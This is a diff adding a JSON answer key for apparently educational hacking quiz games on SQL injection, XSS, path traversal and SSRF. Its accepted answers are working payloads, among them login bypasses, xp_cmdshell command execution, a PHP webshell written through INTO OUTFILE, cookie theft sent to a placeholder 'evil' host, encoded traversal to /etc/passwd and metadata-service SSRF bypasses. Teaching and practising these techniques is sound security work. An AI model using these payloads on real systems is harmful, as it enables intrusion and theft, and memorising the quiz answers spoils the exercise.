@@ -1,0 +1,328 @@
+{
+ "game-sqli-puzzle": {
+  "kind": "input",
+  "intro": "Craft the payload. Quotes and spacing are normalised when checked.",
+  "challenges": [
+   {
+    "q": "Query: SELECT * FROM users WHERE user='INPUT' AND pass='x'. Bypass the login. Give the value for INPUT.",
+    "answers": [
+     "' or 1=1-- -",
+     "' or 1=1--",
+     "' or '1'='1",
+     "' or 1=1#",
+     "admin' or '1'='1",
+     "'or 1=1--"
+    ],
+    "hint": "Close the string, make the condition true, comment the rest."
+   },
+   {
+    "q": "The query returns 3 columns. Give the fragment that tests for 4 columns and should error.",
+    "answers": [
+     "' union select 1,2,3,4-- -",
+     "' union select null,null,null,null-- -",
+     "' union select 1,2,3,4--",
+     "1 union select 1,2,3,4--"
+    ],
+    "hint": "UNION SELECT with four values"
+   },
+   {
+    "q": "Query returns 3 columns and renders the 2nd. Extract the MySQL version into the rendered column.",
+    "answers": [
+     "' union select 1,@@version,3-- -",
+     "' union select 1,version(),3-- -",
+     "' union select 1,@@version,3--",
+     "-1 union select 1,@@version,3-- -"
+    ],
+    "hint": "The version function goes in position two"
+   },
+   {
+    "q": "Query returns 2 columns. List table names from the current database.",
+    "answers": [
+     "' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -",
+     "' union select table_name,2 from information_schema.tables-- -",
+     "' union select 1,table_name from information_schema.tables-- -",
+     "' union select 1,group_concat(table_name) from information_schema.tables-- -"
+    ],
+    "hint": "information_schema.tables"
+   },
+   {
+    "q": "Blind boolean injection with no output. Give the test that makes the condition always true.",
+    "answers": [
+     "' or 1=1-- -",
+     "' or 'a'='a",
+     "' or 1=1#",
+     "' or 1=1--"
+    ],
+    "hint": "An always-true condition"
+   },
+   {
+    "q": "Time-based blind on MySQL. Give the payload that delays five seconds.",
+    "answers": [
+     "' or sleep(5)-- -",
+     "'; select sleep(5)-- -",
+     "1' and sleep(5)-- -",
+     "' or sleep(5)#"
+    ],
+    "hint": "Conditional delay"
+   },
+   {
+    "q": "Microsoft SQL Server with sysadmin. Give the payload to run a Windows command.",
+    "answers": [
+     "'; exec xp_cmdshell 'whoami'-- -",
+     "'; exec master..xp_cmdshell 'whoami'-- -",
+     "exec xp_cmdshell 'whoami'",
+     "'; exec xp_cmdshell 'whoami'--"
+    ],
+    "hint": "The SQL Server command shell procedure"
+   },
+   {
+    "q": "MySQL. Write a PHP webshell into the web root using the query result.",
+    "answers": [
+     "union select 1,'<?php system($_GET[0]); ?>' into outfile '/var/www/html/shell.php'-- -",
+     "' union select 1,2 into outfile '/var/www/html/shell.php'-- -",
+     "union select '<?php system($_GET[0]); ?>' into outfile '/var/www/html/shell.php'-- -"
+    ],
+    "hint": "INTO OUTFILE"
+   }
+  ]
+ },
+ "game-xss-builder": {
+  "kind": "input",
+  "intro": "Your payload must execute script. Give the exact string you would send.",
+  "challenges": [
+   {
+    "q": "Input lands directly in the HTML body, unescaped. Payload that alerts?",
+    "answers": [
+     "<script>alert(1)</script>",
+     "<script>alert('xss')</script>",
+     "<script>alert(document.domain)</script>",
+     "<img src=x onerror=alert(1)>"
+    ],
+    "hint": "A script tag"
+   },
+   {
+    "q": "Input lands in a double-quoted attribute. Tags are filtered. Payload?",
+    "answers": [
+     "\" onmouseover=alert(1) x=\"",
+     "\"onmouseover=alert(1) x=\"",
+     "\" autofocus onfocus=alert(1) x=\"",
+     "\" onfocus=alert(1) autofocus x=\""
+    ],
+    "hint": "Close the quote and add an event handler"
+   },
+   {
+    "q": "Input lands in a single-quoted attribute. Payload?",
+    "answers": [
+     "' onmouseover=alert(1) x='",
+     "'onmouseover=alert(1) x='",
+     "' autofocus onfocus=alert(1) x='"
+    ],
+    "hint": "Same idea, single quote"
+   },
+   {
+    "q": "Input lands inside a JS string with single quotes filtered out. Payload?",
+    "answers": [
+     "</script><script>alert(1)</script>",
+     "\\';alert(1)//",
+     "-alert(1)-",
+     "\"+alert(1)+\""
+    ],
+    "hint": "Break out of the script block"
+   },
+   {
+    "q": "Tags stripped, input lands in an href attribute. Give a URL that executes JS on click.",
+    "answers": [
+     "javascript:alert(1)",
+     "javascript:alert(document.domain)",
+     "javascript:alert(1)//"
+    ],
+    "hint": "The javascript scheme"
+   },
+   {
+    "q": "Steal document.cookie and send it to your listener.",
+    "answers": [
+     "<script>fetch('http://evil/?c='+document.cookie)</script>",
+     "<script>new Image().src='http://evil/?c='+document.cookie</script>",
+     "<script>location='http://evil/?c='+document.cookie</script>",
+     "<script>document.location='http://evil/?c='+document.cookie</script>"
+    ],
+    "hint": "Exfiltrate with an image or fetch"
+   },
+   {
+    "q": "Angle brackets are blocked but you are in an attribute context. Give a payload with no tags that still executes.",
+    "answers": [
+     "\" onmouseover=alert(1) x=\"",
+     "\"onmouseover=alert(1)"
+    ],
+    "hint": "Event handlers need no angle brackets"
+   },
+   {
+    "q": "Give a payload that works in both attribute and body context.",
+    "answers": [
+     "\"><script>alert(1)</script>",
+     "<script>alert(1)</script>",
+     "javascript:alert(1)"
+    ],
+    "hint": "Close the attribute then add a tag"
+   }
+  ]
+ },
+ "game-traversal-hunt": {
+  "kind": "input",
+  "intro": "Reach the file through the filter. Encodings welcome.",
+  "challenges": [
+   {
+    "q": "page=about loads from /var/www/html/pages/. No filtering. Payload for /etc/passwd?",
+    "answers": [
+     "../../../../etc/passwd",
+     "../../../../../../etc/passwd",
+     "/etc/passwd"
+    ],
+    "hint": "Count the directory levels"
+   },
+   {
+    "q": "The filter removes dot dot slash once, non-recursively. Payload?",
+    "answers": [
+     "....//....//....//....//etc/passwd",
+     "....//....//....//etc/passwd",
+     "..././..././..././..././etc/passwd"
+    ],
+    "hint": "Nest so removal creates the sequence"
+   },
+   {
+    "q": "Filter strips traversal but decodes after filtering. Payload?",
+    "answers": [
+     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+     "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+     "..%2f..%2f..%2fetc/passwd"
+    ],
+    "hint": "Encode the traversal"
+   },
+   {
+    "q": "Double encoding is required. Payload?",
+    "answers": [
+     "%252e%252e%252f%252e%252e%252fetc/passwd",
+     "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+     "%252e%252e/%252e%252e/etc/passwd"
+    ],
+    "hint": "Encode the percent sign itself"
+   },
+   {
+    "q": "The app appends .php to your input. How do you still get /etc/passwd on a legacy runtime?",
+    "answers": [
+     "/etc/passwd%00",
+     "/etc/passwd%00.php",
+     "/etc/passwd\\0"
+    ],
+    "hint": "Null byte truncation"
+   },
+   {
+    "q": "Windows target, from pages/. Payload for C:\\Windows\\win.ini?",
+    "answers": [
+     "..\\..\\..\\windows\\win.ini",
+     "../../../../windows/win.ini",
+     "..%5c..%5cwindows%5cwin.ini",
+     "..\\..\\windows\\win.ini"
+    ],
+    "hint": "Windows uses backslashes, and they encode too"
+   },
+   {
+    "q": "Path checks block traversal entirely. Use a PHP stream wrapper to read index.php base64-encoded.",
+    "answers": [
+     "php://filter/convert.base64-encode/resource=index.php",
+     "php://filter/read=convert.base64-encode/resource=index.php",
+     "php://filter/convert.base64-encode/resource=../../../index.php"
+    ],
+    "hint": "PHP wrappers bypass path validation"
+   },
+   {
+    "q": "You cannot read /etc/passwd. Give another Linux file that always exists and is world readable.",
+    "answers": [
+     "/etc/hostname",
+     "/etc/hosts",
+     "/proc/version",
+     "../../../../etc/hosts",
+     "../../../../etc/hostname"
+    ],
+    "hint": "Every Linux host has these"
+   }
+  ]
+ },
+ "game-ssrf-filter": {
+  "kind": "input",
+  "intro": "Get past the blocklist and reach the target. Give the URL or host you would supply.",
+  "challenges": [
+   {
+    "q": "The filter blocks the literal string 127.0.0.1. Reach the local service on port 80 another way.",
+    "answers": [
+     "http://2130706433/",
+     "2130706433",
+     "http://0x7f000001/",
+     "http://0177.0.0.1/",
+     "http://127.1/",
+     "http://0/"
+    ],
+    "hint": "Other representations of the same address"
+   },
+   {
+    "q": "The filter blocks localhost and 127.0.0.1. Give an IPv6 form that reaches loopback.",
+    "answers": [
+     "http://[::1]/",
+     "::1",
+     "http://[0:0:0:0:0:0:0:1]/",
+     "http://[::ffff:127.0.0.1]/"
+    ],
+    "hint": "IPv6 loopback"
+   },
+   {
+    "q": "Reach the cloud metadata service. Give the full URL.",
+    "answers": [
+     "http://169.254.169.254/latest/meta-data/",
+     "http://169.254.169.254/",
+     "169.254.169.254"
+    ],
+    "hint": "Link-local metadata address"
+   },
+   {
+    "q": "On AWS with IMDSv2 the metadata service needs a token. Give the header-based step: what must you obtain first?",
+    "answers": [
+     "a token",
+     "token",
+     "session token",
+     "imds token",
+     "x-aws-ec2-metadata-token"
+    ],
+    "hint": "It is a token"
+   },
+   {
+    "q": "The filter only allows URLs starting with https://yourdomain.com. You control the DNS for yourdomain.com. What do you point it at?",
+    "answers": [
+     "127.0.0.1",
+     "localhost",
+     "127.0.0.1 (an A record to loopback)",
+     "internal ip"
+    ],
+    "hint": "You control the resolution"
+   },
+   {
+    "q": "The server follows redirects and validates the URL before fetching. What do you host?",
+    "answers": [
+     "a redirect to 127.0.0.1",
+     "redirect",
+     "a 302 to the internal address",
+     "a redirect to the metadata service"
+    ],
+    "hint": "Validation before the redirect is worthless"
+   },
+   {
+    "q": "The filter blocks 169.254.169.254. Give a decimal representation of that address.",
+    "answers": [
+     "2852039166",
+     "http://2852039166/",
+     "2852039166/"
+    ],
+    "hint": "Convert the dotted quad to a single integer"
+   }
+  ]
+ }
+}
